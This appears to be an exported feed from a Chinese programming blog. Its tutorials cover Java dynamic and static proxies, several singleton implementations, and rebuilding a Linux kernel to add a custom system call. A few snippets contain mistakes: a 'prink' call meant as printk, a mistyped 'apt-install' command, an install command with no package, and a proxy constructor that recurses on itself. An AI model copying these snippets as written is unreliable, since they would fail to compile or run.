class="keyword">class</span> <span class="title">Chef</span> <span class="keyword">implements</span> <span class="title">Cook</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">cook</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 具体的实际实现逻辑</span></span><br><span class="line">        System.out.println(<span class="string">"=======厨师做饭啦:"</span>+name+<span class="string">"======="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用于自动生成代理类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 被代理的接口</span></span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTarget</span><span class="params">(Object target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 生成得到代理类</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getProxy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(<span class="keyword">this</span>.getClass().getClassLoader(),</span><br><span class="line">                target.getClass().getInterfaces(), <span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理代理实例 并返回结果</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> proxy  代理对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> method 代理对象调用的方法</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 调用的方法中的参数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Throwable</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        before();</span><br><span class="line">        <span class="comment">//  动态代理的本质，是利用反射机制实现</span></span><br><span class="line">        Object result = method.invoke(target, args);</span><br><span class="line">        after();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 预处理</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"=======食材准备完毕======="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 后处理</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">after</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"=======厨具清理完毕======="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>控制台输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;食材准备完毕&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;厨师做饭啦:番茄炒蛋&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;厨具清理完毕&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>优点：只需要定义实现<code>InvocationHandler</code>接口的实现类，利用该类的实例对象将托管类的实例对象进行绑定即可实现代理； 动态代理的服务内容不需要像静态代理一样写在每个代码块中，只需要写在invoke()方法中即可，降低了代码的冗余度。 </p>
</li>
<li><p>缺点：任然需要一个实现接口的实现类。要想不需要接口，可借助 <code>CGLIB</code>，关于相关的用法，不在本文介绍范围之内。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>动态代理</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式之静态代理</title>
    <url>/2020/05/10/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<h2 id="代理模式定义"><a href="#代理模式定义" class="headerlink" title="代理模式定义"></a>代理模式定义</h2><p>代理模式又叫委托模式，为某一个对象提供一个代理对象，代理通过访问原对象，使得真正实施动作的是原对象。一个简单的例子就是：</p>
<p>一个厨师想要做饭的时候，他必须要有食材，做完饭之后需要清理厨具，但是对于厨师来说，他的任务就是做饭，其他的事情他不想插手，那么他就可以雇用一个帮手，为他做这些准备工作和处理工作。<a id="more"></a></p>
<p>代理模式一般可分为静态代理和动态代理：</p>
<ul>
<li>静态代理： 由程序员创建或工具生成代理类的源码，再编译代理类。 静态代理也就是意味着程序运行之前就已经自动生成代理类的字节码文件，代理类和委托类的关系就已经确认下来。</li>
<li>动态代理： 动态代理类的源码是在程序运行期间由JVM根据反射等机制动态的生成，过程不会生成多余的字节码文件，代理类和委托类的关系在运行时期确认。</li>
</ul>
<p>本文只讨论静态代理。</p>
<h2 id="代码说明"><a href="#代码说明" class="headerlink" title="代码说明"></a>代码说明</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> study.design.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StaticProxy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Cook chef  = <span class="keyword">new</span> Chef();</span><br><span class="line">        Cook chefProxy = <span class="keyword">new</span> ChefProxy(chef);</span><br><span class="line">        chefProxy.cook();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 委托类和代理类都要实现该接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Cook</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">cook</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chef</span> <span class="keyword">implements</span> <span class="title">Cook</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">cook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 具体的实际实现逻辑</span></span><br><span class="line">        System.out.println(<span class="string">"=======厨师做饭啦======="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChefProxy</span> <span class="keyword">implements</span> <span class="title">Cook</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Cook chef = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 默认代理自己</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ChefProxy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.chef = <span class="keyword">new</span> ChefProxy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指明需要代理的对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ChefProxy</span><span class="params">(Cook chef)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.chef = chef;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">cook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.before();</span><br><span class="line">        <span class="keyword">this</span>.chef.cook();</span><br><span class="line">        <span class="keyword">this</span>.after();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 预处理</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"=======食材准备完毕======="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 后处理</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">after</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"=======厨具清理完毕======="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>控制台输出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;食材准备完毕&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;厨师做饭啦&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;厨具清理完毕&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<ul>
<li>优点：委托类只关心具体的逻辑，无需浪费时间在其他无关事务上面；代理类还可以实现对委托类的管控，例如说上文的例子，假如某道菜厨师不会做或者不在行，帮手可以提醒或者直接拒绝厨师的行为，即根据对象的权限来进行实施动作。</li>
<li>不足：<ul>
<li>需要代理的逻辑方法比较少的时候难度不大，假如方法非常多的时候，代码量就会非常多</li>
<li>接口增加方法的时候，不仅仅委托类需要实现该方法，代理类也需要实现该方法，代码维护难度大。</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>静态代理</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈设计模式之单例模式</title>
    <url>/2020/05/07/%E6%B5%85%E8%B0%88%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<p>单例模式： 保证一个类仅有一个实例，并提供一个访问它的全局访问点， 目的是为了保证在一个进程中，某个类有且仅有一个实例。 </p>
<p>要做到这点，必须将构造方法进行私有，防止外部通过构造方法进行实例化该类，在类内部提供方法引用唯一创建的实例。<a id="more"></a></p>
<h2 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h2><h3 id="懒汉模式"><a href="#懒汉模式" class="headerlink" title="懒汉模式"></a>懒汉模式</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> study.design.singleton;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样外部类就不能通过构造方法进行实例化该类，只能通过<code>Singleton.getInstance()</code>的方式进行获取唯一的对象。但是很遗憾，该方式没有考虑多线程的情况，不同的线程同时调用<code>Singleton.getInstance()</code>的时候很有可能会实例化多个对象。因此需要对<code>getInstance()</code>进行加锁</p>
<h3 id="加强版懒汉模式（线程安全）"><a href="#加强版懒汉模式（线程安全）" class="headerlink" title="加强版懒汉模式（线程安全）"></a>加强版懒汉模式（线程安全）</h3><p>给加上<code>getInstance()</code>，加上<code>synchronized</code>关键字</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> study.design.singleton;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样多线程并发执行<code>getInstance()</code>的时候，就只有最早拿到锁的线程能够执行<code>instance = new Singleton()</code>，其他的线程从阻塞队列中下来的时候<code>Singleton</code>已经被实例化了，因此不会执行<code>instance = new Singleton()</code>，从而确保多线程安全。 遗憾的是，由于synchronized的存在，效率很低，在单线程的情景下，完全可以去掉synchronized，为了兼顾效率与性能问题，改进后代码如下： </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> study.design.singleton;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该方法也叫<strong>“双重校验法”</strong>，在<code>instance != null</code>的时候，就不会进行加锁操作，提升了系统性能。但是理论是美好的，而现实是残酷的， 由于Java的内存模型 ，上述代码在执行期间还是有些不同，具体参照<a href="https://blog.csdn.net/chenchaofuck1/article/details/51702129" target="_blank" rel="noopener">这篇文章</a></p>
<h3 id="饿汉模式"><a href="#饿汉模式" class="headerlink" title="饿汉模式"></a>饿汉模式</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> study.design.singleton;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance = <span class="keyword">new</span> Singleton();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该模式在加载该类的时候直接实例化该类，因此不管用与不用都占着空间，如果项目中有大量单例对象，则可能会浪费大量内存空间 </p>
<h3 id="静态内部类加载"><a href="#静态内部类加载" class="headerlink" title="静态内部类加载"></a>静态内部类加载</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> study.design.singleton;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> SingletonHolder.instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SingletonHolder</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该模式在加载<code>Singleton</code>类的时候不会直接实例化该类，而是调用<code>getInstance()</code>后才实例化<code>Singleton</code>类，做到了懒加载的效果，而且是线程安全的。</p>
<h3 id="借助枚举类"><a href="#借助枚举类" class="headerlink" title="借助枚举类"></a>借助枚举类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> study.design.singleton;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> Singleton &#123;</span><br><span class="line">    INSTANCE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>是不是十分的简洁？这种方式解决了以下三个问题：</p>
<ul>
<li>自由序列化。关于序列化，<a href="https://www.runoob.com/java/java-serialization.html" target="_blank" rel="noopener">这里</a>有比较详细的介绍</li>
<li>保证只有一个实例。</li>
<li>线程安全。</li>
</ul>
<p>引用实例对象的时候只需要：<code>Singleton singleton = Singleton.INSTANCE</code>即可，当然了，我们也可以像常规类一样添加变量和方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> study.design.singleton;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> Singleton &#123;</span><br><span class="line">    INSTANCE;</span><br><span class="line">    <span class="keyword">private</span> String name = <span class="string">"INSTANCE"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用的时候只需<code>Singleton.INSTANCE.getName()</code>。</p>
<p>但是在<code>Android</code>平台上面，<code>Android</code>官方不建议使用枚举类实现单例， 因为内存消耗会其他方式多一些 。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>单例的实现方式有多种，该怎么选择需要根据实际情况考虑，如果说不考虑多线程则直接使用懒汉模式，简单又节约，如果说考虑多线程则建议使用双重校验法或者静态内部法，或者如果说确保项目中使用单例情况非常少，则可以考虑使用枚举实现。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>单例模式</tag>
      </tags>
  </entry>
  <entry>
    <title>通过编译内核的方式增加系统调用</title>
    <url>/2020/05/02/%E9%80%9A%E8%BF%87%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E7%9A%84%E6%96%B9%E5%BC%8F%E5%A2%9E%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/</url>
    <content><![CDATA[<blockquote>
<p>Ubuntu 版本：20.04 LTS</p>
<p>虚拟机配置：硬盘：40 GB 内存：4 GB</p>
<p>内核版本：5.4.0.26-generic</p>
<p>VMware 版本：15.5.0</p>
</blockquote>
<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>编译的时候需要一些库，所以要提前安装：<a id="more"></a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libncurses5-dev</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install bison</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install flex</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libssl-dev</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install build-essential</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-install kernel-package</span><br></pre></td></tr></table></figure>

<p>这么多？？好吧，其实不一定需要全部，部分Linux发行版可能自带，可以先跳过这一步，先做后面的事情，前提是自己先做好中途出现<code>error</code>的准备！中途出现错误的话可以根据提示安装即可。</p>
<h2 id="查看自己内核版本"><a href="#查看自己内核版本" class="headerlink" title="查看自己内核版本"></a>查看自己内核版本</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>

<p>我的是 5.4.0.26-generic</p>
<h2 id="下载内核"><a href="#下载内核" class="headerlink" title="下载内核"></a>下载内核</h2><p>尽量下载和自己内核相近的内核,避免版本跨度过大引起不兼容情况。下面是网址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;cdn.kernel.org&#x2F;pub&#x2F;linux&#x2F;kernel</span><br></pre></td></tr></table></figure>

<p>我下载的是<code>linux-5.3.9.tar.xz</code></p>
<h2 id="解压缩内核文件"><a href="#解压缩内核文件" class="headerlink" title="解压缩内核文件"></a>解压缩内核文件</h2><p>首先将上面的内核文件移动到<code>/usr/src/</code>目录下</p>
<p>在<code>/usr/src/</code>目录下打开终端</p>
<p>解压</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo xz -d linux-5.3.9.tar.xz</span><br></pre></td></tr></table></figure>

<p>解包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo tar -xvf linux-5.3.9.tar</span><br></pre></td></tr></table></figure>

<h2 id="加入函数"><a href="#加入函数" class="headerlink" title="加入函数"></a>加入函数</h2><p>解包完毕之后会出现一个<code>linux-5.3.9</code>文件夹，进入该文件夹的<code>kernel</code>文件夹中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd linux-5.3.9&#x2F;kernel</span><br></pre></td></tr></table></figure>

<p>编辑<code>sys.c</code>文件，在末尾加入函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_hello</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    prink(<span class="string">"hello syscall!"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="添加函数声明"><a href="#添加函数声明" class="headerlink" title="添加函数声明"></a>添加函数声明</h2><p>进入<code>/usr/src/linux-5.3.9/arch/x86/include/asm</code></p>
<p>编辑 <code>syscalls.h</code>，加入我们的<code>sys_hello</code>函数：</p>
<img src="/2020/05/02/%E9%80%9A%E8%BF%87%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E7%9A%84%E6%96%B9%E5%BC%8F%E5%A2%9E%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/1588224505122.png" class>

<h2 id="给我们的系统调用分配一个id"><a href="#给我们的系统调用分配一个id" class="headerlink" title="给我们的系统调用分配一个id"></a>给我们的系统调用分配一个id</h2><p>打开<code>/usr/src/linux-5.3.9/arch/x86/entry/syscalls/syscall_64.tbl</code>，</p>
<p>一定要确保不会跟已有的冲突</p>
<p>我加的是</p>
<p>548 64 hello sys_hello</p>
<img src="/2020/05/02/%E9%80%9A%E8%BF%87%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E7%9A%84%E6%96%B9%E5%BC%8F%E5%A2%9E%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/1588225138576.png" class>

<h2 id="配置内核"><a href="#配置内核" class="headerlink" title="配置内核"></a>配置内核</h2><p>进入到<code>/usr/src/linux-5.3.9</code>目录下，依次执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo make mrproper</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo make clean</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo make menuconfig</span><br></pre></td></tr></table></figure>

<p>假如执行<code>sudo make menuconfig</code>时候出现下面的错误</p>
<img src="/2020/05/02/%E9%80%9A%E8%BF%87%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E7%9A%84%E6%96%B9%E5%BC%8F%E5%A2%9E%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/1588253321277.png" class>

<p>将虚拟机全屏即可（撑满屏幕）</p>
<p>然后出现该页面，直接<code>save</code>，然后<code>exit</code>。</p>
<img src="/2020/05/02/%E9%80%9A%E8%BF%87%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E7%9A%84%E6%96%B9%E5%BC%8F%E5%A2%9E%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/1588253775435.png" class>

<p>然后就可以通过下面的命令编译我们的内核了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo make</span><br></pre></td></tr></table></figure>

<p>该过程大概持续几个小时，反正我是放后台，然后先去睡觉的~~。</p>
<p><strong>但是！等我睡醒才发现，电脑自动休眠了！白白浪费了一个晚上的时间，所以提醒编译之前将电脑的休眠模式关闭。还有编译过程会产生大量中间文件，建议硬盘给够 40 GB</strong></p>
<img src="/2020/05/02/%E9%80%9A%E8%BF%87%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E7%9A%84%E6%96%B9%E5%BC%8F%E5%A2%9E%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/1588329524537.png" class>

<p>出现类似上面的信息就说明编译成功了。</p>
<h2 id="生成modules"><a href="#生成modules" class="headerlink" title="生成modules"></a>生成modules</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo make modules</span><br></pre></td></tr></table></figure>

<p>这个过程也需要一定的时间。</p>
<h2 id="安装modules"><a href="#安装modules" class="headerlink" title="安装modules"></a>安装modules</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo make modules_install</span><br></pre></td></tr></table></figure>

<h2 id="将内核安装进系统中"><a href="#将内核安装进系统中" class="headerlink" title="将内核安装进系统中"></a>将内核安装进系统中</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<h2 id="重启并测试"><a href="#重启并测试" class="headerlink" title="重启并测试"></a>重启并测试</h2><p>重启过程进入高级选项</p>
<p>刚刚重启的时候按下<code>ESC</code>（网上说是<code>ESC</code>，但是我的是长按<code>Shift</code>）</p>
<img src="/2020/05/02/%E9%80%9A%E8%BF%87%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E7%9A%84%E6%96%B9%E5%BC%8F%E5%A2%9E%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/1588383413241.png" class>

<p>选择高级选项，然后选择新内核</p>
<img src="/2020/05/02/%E9%80%9A%E8%BF%87%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E7%9A%84%E6%96%B9%E5%BC%8F%E5%A2%9E%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/1588383460106.png" class>

<p>假如进入内核的过程出现<code>kernel panic not syncing:System is deadlocked on memory</code>错误，只需要将内存增大即可。</p>
<p>新建测试源程序<code>testMyCall.c</code></p>
